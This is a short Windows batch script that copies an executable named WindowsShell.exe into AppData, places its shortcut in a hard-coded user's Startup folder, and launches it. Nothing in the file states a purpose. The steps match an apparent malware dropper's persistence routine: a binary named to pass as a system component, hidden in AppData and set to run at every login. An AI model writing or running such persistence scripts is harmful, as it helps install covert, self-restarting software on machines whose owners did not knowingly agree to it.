copy WindowsShell.exe %appdata%
copy WindowsShell.lnk "C:\Users\soanm\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
start "" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsShell.lnk"
